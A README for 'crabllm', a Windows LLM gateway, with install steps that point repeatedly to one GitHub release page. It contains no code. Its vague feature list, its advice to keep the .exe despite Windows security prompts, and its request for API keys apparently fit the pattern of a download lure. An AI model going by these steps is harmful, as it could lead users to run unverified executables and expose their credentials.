# 🦀 crabllm - Simple LLM Gateway for Windows

[![Download crabllm](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Impure-platen433/crabllm/releases)

## 🧭 What crabllm does

crabllm is a desktop-style LLM gateway that helps you route AI requests through one place. It can track usage costs, apply guardrails, balance load, and keep logs in one spot.

Use it when you want a single setup for common LLM providers like OpenAI, Anthropic, and Bedrock. It fits well for people who want a simple way to manage AI access on a Windows PC.

## 💻 Windows install

1. Open the [crabllm release page](https://github.com/Impure-platen433/crabllm/releases).
2. Find the latest release at the top of the page.
3. Look under **Assets**.
4. Download the Windows file for your system.
5. If the file is a `.zip`, unzip it first.
6. If the file is an `.exe`, run it after the download finishes.
7. If Windows shows a security prompt, choose the option to keep the file and continue only if the file came from the release page you opened.
8. Open crabllm from the file you downloaded.

## 🛠️ Before you start

You need a Windows PC with a current version of Windows 10 or Windows 11. crabllm also works best when your machine has:

- At least 8 GB of memory
- A steady internet connection
- Enough disk space for logs and local settings
- Access to the AI provider you plan to use

If you plan to connect it to OpenAI, Anthropic, or Bedrock, have your API key ready before you begin.

## 📦 Download and open

Use this page to get the app:

[Visit the crabllm release page](https://github.com/Impure-platen433/crabllm/releases)

After you open the release page:

1. Pick the newest version.
2. Download the Windows build.
3. Save it to your Downloads folder or Desktop.
4. Open the file you downloaded.
5. Follow the prompts on screen.

If you see a folder with files instead of a single app file, open the folder and look for the main `.exe` file.

## ⚙️ First-time setup

After you open crabllm for the first time, set up the parts you want to use.

### API provider setup

Choose the AI provider you want to connect:

- OpenAI
- Anthropic
- Bedrock

Then enter the API key from that provider. crabllm uses that key to send requests through the gateway.

### Basic gateway setup

Set these values if the app asks for them:

- Gateway name
- Default model
- Request timeout
- Retry count
- Log location

Use the default values if you are not sure. They work for most first runs.

## 🔐 Guardrails

crabllm can help you place limits on what gets sent through the gateway. This can help you keep requests within a set pattern.

Common guardrail options may include:

- Block unsafe prompts
- Limit request size
- Filter certain words
- Set model rules
- Control which apps can use the gateway

If you only need a simple setup, start with the default rules and adjust later.

## 📈 Cost tracking

crabllm keeps track of usage so you can see what each request costs. This can help you monitor spend by:

- Model
- Provider
- User
- Request type
- Time period

If you use more than one AI service, cost tracking can help you compare them in one place.

## 🔀 Load balancing

When you have more than one backend or model route, crabllm can spread requests across them. This helps reduce slowdowns when one path is busy.

You can use load balancing to:

- Spread traffic across multiple endpoints
- Keep requests moving when one model is slow
- Set a fallback route
- Use a simple round-robin pattern

For most home or small team use, the default route is enough.

## 📝 Logging

crabllm records request activity so you can review what happened later. Logs can help you check:

- Request time
- Response time
- Provider used
- Model used
- Errors
- Cost data

If something does not work, the logs are the first place to look.

## 🧪 Typical use case

A simple setup might look like this:

1. Run crabllm on your Windows PC.
2. Add your OpenAI or Anthropic key.
3. Choose a model.
4. Turn on cost tracking.
5. Keep guardrails on.
6. Send your app traffic through crabllm instead of calling the provider directly.

This gives you one place to manage AI use without changing each app in a different way.

## 🔗 Supported ecosystems

crabllm is built around common LLM gateway use cases and works well with tools and services in the AI gateway space, including:

- AI gateway setups
- LLM ops workflows
- OpenAI-based apps
- Anthropic-based apps
- Bedrock-based apps
- MCP gateway use cases

If your app can point to a gateway endpoint, crabllm fits that flow.

## 🧰 Troubleshooting

### The app does not open

- Check that the download finished fully
- Make sure you opened the right file
- If the app came in a zip file, unzip it first
- Try running it again as the same Windows user who downloaded it

### Windows blocked the file

- Open the download page again
- Download the latest release from the official release page
- Run the file from the download you just made

### The provider does not work

- Check your API key
- Check your internet connection
- Make sure the selected model exists for that provider
- Try a simpler model name first

### No logs appear

- Check the log folder path
- Confirm the app has permission to write files
- Start with the default settings and test again

## 📁 What you may see in the release files

Depending on the release, you may see:

- A Windows executable
- A zip archive
- A config file
- A README file
- A log folder

If you are not sure which file to open, use the `.exe` file for Windows. If the release only gives you a zip file, open the zip and look for the main app file inside.

## 🧭 Simple setup path

If you want the fastest path, do this:

1. Open the [release page](https://github.com/Impure-platen433/crabllm/releases)
2. Download the latest Windows build
3. Run the app
4. Add your provider key
5. Keep the default gateway settings
6. Test one request
7. Check the log if the request fails

## 🖥️ Main features at a glance

- LLM gateway routing
- Cost tracking
- Guardrails
- Load balancing
- Logging
- OpenAI support
- Anthropic support
- Bedrock support
- MCP gateway use cases

## 📌 File and folder tips

If you keep crabllm for regular use, place it in a folder you can find later, such as:

- Desktop
- Downloads
- Documents
- A tools folder

Keep the config and log files in the same place if the app lets you choose. That makes it easier to find them later.

## 🧩 Common terms

- **Gateway**: A middle layer that sends your AI request to the right service
- **API key**: A private code used to connect to an AI service
- **Model**: The AI engine you choose for a request
- **Log**: A record of what happened
- **Load balancing**: Spreading requests across routes so one does not get overloaded
- **Guardrails**: Rules that help keep requests within set limits